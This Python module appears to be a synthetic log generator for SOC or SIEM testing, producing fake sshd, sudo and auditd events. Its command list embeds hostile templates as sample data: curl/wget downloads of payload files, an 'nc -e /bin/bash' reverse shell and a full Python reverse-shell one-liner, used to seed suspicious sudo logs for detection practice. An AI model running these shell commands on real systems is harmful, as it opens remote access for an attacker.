#!/usr/bin/env python3
"""
Linux Auth and System Log Generator

Generates realistic Linux authentication and system logs:
- SSH authentication (sshd)
- Sudo command execution
- System authentication (login, su)
- Cron jobs
- Systemd services

Output formats:
- Syslog RFC 3164/5424
- Journald (JSON)
- Raw log files

Reference: https://www.rsyslog.com/doc/
"""

import random
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional
try:
    from ..base import BaseGenerator
    from ...core import LogEvent, EventSeverity, AssetInventory
except (ImportError, ValueError):
    from generators.base import BaseGenerator
    from core import LogEvent, EventSeverity, AssetInventory


class LinuxAuthGenerator(BaseGenerator):
    """Generateur de logs Linux pour SOC"""
    
    FACILITIES = ['auth', 'authpriv', 'cron', 'daemon', 'kern', 'mail', 'user', 'local0']
    PRIORITIES = ['debug', 'info', 'notice', 'warning', 'err', 'crit', 'alert', 'emerg']
    
    SERVICES = {
        'sshd': [
            ("Accepted password for {user} from {ip} port {port} ssh2", 'info', EventSeverity.LOW),
            ("Failed password for {user} from {ip} port {port} ssh2", 'warning', EventSeverity.MEDIUM),
            ("Failed password for invalid user {user} from {ip} port {port} ssh2", 'warning', EventSeverity.HIGH),
            ("Connection closed by {ip} port {port}", 'info', EventSeverity.LOW),
            ("Received disconnect from {ip} port {port}:11: disconnected by user", 'info', EventSeverity.LOW),
            ("PAM {count} more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}", 'warning', EventSeverity.MEDIUM),
            ("error: PAM: Authentication failure for {user} from {ip}", 'err', EventSeverity.MEDIUM),
            ("reverse mapping checking getaddrinfo for {hostname} [{ip}] failed - POSSIBLE BREAK-IN ATTEMPT!", 'alert', EventSeverity.HIGH),
        ],
        'sudo': [
            ("{user} : TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={cmd}", 'notice', EventSeverity.LOW),
            ("pam_unix(sudo:session): session opened for user root by {user}(uid=0)", 'info', EventSeverity.LOW),
            ("pam_unix(sudo:session): session closed for user root", 'info', EventSeverity.LOW),
            ("{user} : {count} incorrect password attempts ; TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={cmd}", 'warning', EventSeverity.MEDIUM),
            ("{user} : user NOT in sudoers ; TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={cmd}", 'alert', EventSeverity.HIGH),
        ],
        'cron': [
            ("({user}) CMD ({cmd})", 'info', EventSeverity.LOW),
            ("({user}) RELOAD (crontabs/{user})", 'info', EventSeverity.LOW),
        ],
        'systemd': [
            ("Started {service}.", 'info', EventSeverity.LOW),
            ("Stopped {service}.", 'info', EventSeverity.LOW),
            ("{service}: Main process exited, code=exited, status={status}", 'warning', EventSeverity.MEDIUM),
            ("{service} failed to start.", 'err', EventSeverity.HIGH),
        ],
        'kernel': [
            ("[{timestamp}] iptables IN={iface} OUT= MAC={mac} SRC={srcip} DST={dstip} LEN={len} TOS={tos} PREC={prec} TTL={ttl} ID={id} DF PROTO={proto} SPT={spt} DPT={dpt} WINDOW={win} RES={res} {flags} URGP=0", 'warning', EventSeverity.MEDIUM),
            ("audit: type=1300 audit({audit_ts}): arch=c000003e syscall={syscall} success=yes exit=0 a0={a0} a1={a1} a2={a2} a3={a3} items={items} ppid={ppid} pid={pid} auid={auid} uid={uid} gid={gid} euid={euid} suid={suid} fsuid={fsuid} egid={egid} sgid={sgid} fsgid={fsgid} tty={tty} ses={ses} comm=\"{comm}\" exe=\"{exe}\" key=\"{key}\"", 'info', EventSeverity.LOW),
        ],
    }
    
    COMMANDS = [
        '/bin/bash',
        '/usr/bin/apt update',
        '/usr/bin/systemctl restart apache2',
        '/usr/bin/cat /etc/passwd',
        '/usr/bin/ls -la /var/log',
        '/usr/bin/tail -f /var/log/syslog',
        '/usr/bin/netstat -tulpn',
        '/usr/bin/ps aux',
        '/usr/bin/curl -s http://{ip}/{path}',
        '/usr/bin/wget -q http://{ip}/{path}',
        '/bin/bash -c "{encoded}"',
        '/usr/bin/nc -e /bin/bash {ip} {port}',
        '/usr/bin/python -c "import socket,subprocess,os;s=socket.socket();s.connect(({ip},{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
    ]
    
    SERVICES_NAMES = [
        'Apache HTTP Server', 'MySQL Database Server', 'PostgreSQL Database Server',
        'Redis In-Memory Data Store', 'Docker Application Container Engine',
        'Nginx HTTP and reverse proxy server', 'SSH server',
    ]
    
    def __init__(self, config: Dict[str, Any], inventory: AssetInventory):
        super().__init__(config)
        self.inventory = inventory
        self.service_weights = config.get('service_weights', [40, 25, 10, 15, 10])
    
    def _get_random_linux_asset(self) -> Dict:
        servers = {k: v for k, v in self.inventory.assets.items() if v.get("type") == "server"}
        if not servers:
            return {"hostname": "SRV-LNX-001", "ip": "10.0.20.11"}
        hostname = random.choice(list(servers.keys()))
        asset = servers[hostname].copy()
        asset["hostname"] = hostname
        return asset
    
    def _generate_sshd_event(self) -> LogEvent:
        """Genere un evenement SSH"""
        asset = self._get_random_linux_asset()
        user = self.inventory.get_random_user()
        timestamp = datetime.now(timezone.utc)
        
        template, level, severity = random.choice(self.SERVICES['sshd'])
        
        # IPs externes ou internes
        if random.random() < 0.3:
            src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:
            src_ip = f"10.0.{random.randint(1, 50)}.{random.randint(1, 254)}"
        
        port = random.randint(22000, 65000)
        
        msg = template.format(
            user=user['username'],
            ip=src_ip,
            port=port,
            hostname=f"host-{random.randint(1, 999)}.isp.com",
            count=random.randint(1, 5)
        )
        
        fields = {
            'service': 'sshd',
            'user': user['username'],
            'source_ip': src_ip,
            'source_port': port,
            'facility': 'authpriv',
            'priority': level,
        }
        
        # Detection de brute force
        if 'Failed password' in msg and random.random() < 0.1:
            severity = EventSeverity.HIGH
            tags = ['linux', 'auth', 'ssh', 'brute_force', 'suspicious']
        else:
            tags = ['linux', 'auth', 'ssh']
        
        return LogEvent(
            timestamp=timestamp,
            source_type='linux',
            source_ip=asset['ip'],
            source_host=asset['hostname'],
            message=msg,
            raw_log=f"{timestamp.strftime('%b %d %H:%M:%S')} {asset['hostname']} sshd[{random.randint(1000, 65535)}]: {msg}",
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def _generate_sudo_event(self) -> LogEvent:
        """Genere un evenement sudo"""
        asset = self._get_random_linux_asset()
        user = self.inventory.get_random_user()
        timestamp = datetime.now(timezone.utc)
        
        template, level, severity = random.choice(self.SERVICES['sudo'])
        
        tty = random.choice(['pts/0', 'pts/1', 'tty1', 'tty2'])
        pwd = random.choice(['/home/' + user['username'], '/etc', '/var/log', '/tmp', '/opt'])
        
        # Commandes suspectes occasionnelles
        if random.random() < 0.05:
            cmd = random.choice(self.COMMANDS[-3:])  # Commandes potentiellement malveillantes
            severity = EventSeverity.HIGH
            tags = ['linux', 'sudo', 'suspicious_command', 'privilege_escalation']
        else:
            cmd = random.choice(self.COMMANDS[:6])
            tags = ['linux', 'sudo']
        
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        path = random.choice(['payload.sh', 'backdoor.py', 'shell.elf', 'config.json', ''])
        encoded = ''.join([random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=') for _ in range(50)])
        port = random.randint(4444, 5555)
        
        cmd = cmd.format(ip=ip, path=path, encoded=encoded, port=port)
        
        msg = template.format(
            user=user['username'],
            tty=tty,
            pwd=pwd,
            cmd=cmd,
            count=random.randint(1, 3)
        )
        
        fields = {
            'service': 'sudo',
            'user': user['username'],
            'tty': tty,
            'pwd': pwd,
            'command': cmd,
            'facility': 'authpriv',
            'priority': level,
        }
        
        return LogEvent(
            timestamp=timestamp,
            source_type='linux',
            source_ip=asset['ip'],
            source_host=asset['hostname'],
            message=msg,
            raw_log=f"{timestamp.strftime('%b %d %H:%M:%S')} {asset['hostname']} sudo: {msg}",
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def _generate_audit_event(self) -> LogEvent:
        """Genere un evenement auditd"""
        asset = self._get_random_linux_asset()
        timestamp = datetime.now(timezone.utc)
        
        syscalls = ['59', '2', '0', '1', '42', '87']
        syscall_names = {'59': 'execve', '2': 'open', '0': 'read', '1': 'write', '42': 'connect', '87': 'unlink'}
        
        syscall = random.choice(syscalls)
        user = self.inventory.get_random_user()
        
        comms = ['bash', 'sh', 'python3', 'curl', 'wget', 'nc', 'cat', 'grep', 'awk', 'sed']
        exes = ['/bin/bash', '/usr/bin/python3', '/usr/bin/curl', '/usr/bin/cat', '/bin/grep']
        keys = ['user_logins', 'file_integrity', 'privileged_cmds', 'suspicious_activity', '']
        
        comm = random.choice(comms)
        exe = random.choice(exes)
        key = random.choice(keys)
        
        audit_ts = f"{int(timestamp.timestamp())}.{random.randint(100000000, 999999999)}:{random.randint(100, 999)}"
        
        fields = {
            'type': 'SYSCALL',
            'arch': 'x86_64',
            'syscall': syscall_names.get(syscall, 'unknown'),
            'syscall_num': syscall,
            'success': 'yes',
            'exit': '0',
            'ppid': random.randint(1, 5000),
            'pid': random.randint(1000, 65535),
            'auid': random.randint(1000, 9999),
            'uid': random.randint(0, 9999),
            'gid': random.randint(0, 9999),
            'euid': random.randint(0, 9999),
            'tty': random.choice(['pts0', 'pts1', 'tty1', 'none']),
            'comm': comm,
            'exe': exe,
            'key': key,
        }
        
        # Syscalls suspects
        severity = EventSeverity.HIGH if syscall in ['59', '42'] and random.random() < 0.3 else EventSeverity.LOW
        tags = ['linux', 'auditd', 'syscall', syscall_names.get(syscall, 'unknown')]
        if severity == EventSeverity.HIGH:
            tags.append('suspicious')
        
        msg = f"type=SYSCALL msg=audit({audit_ts}): arch=c000003e syscall={syscall} success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=0 ppid={fields['ppid']} pid={fields['pid']} auid={fields['auid']} uid={fields['uid']} gid={fields['gid']} euid={fields['euid']} suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty={fields['tty']} ses=1 comm=\"{comm}\" exe=\"{exe}\" key=\"{key}\""
        
        return LogEvent(
            timestamp=timestamp,
            source_type='linux',
            source_ip=asset['ip'],
            source_host=asset['hostname'],
            message=msg,
            raw_log=f"{timestamp.strftime('%b %d %H:%M:%S')} {asset['hostname']} kernel: {msg}",
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def generate_event(self) -> LogEvent:
        """Genere un evenement Linux aleatoire"""
        service = random.choices(['sshd', 'sudo', 'auditd'], weights=[50, 30, 20])[0]
        
        if service == 'sshd':
            return self._generate_sshd_event()
        elif service == 'sudo':
            return self._generate_sudo_event()
        else:
            return self._generate_audit_event()
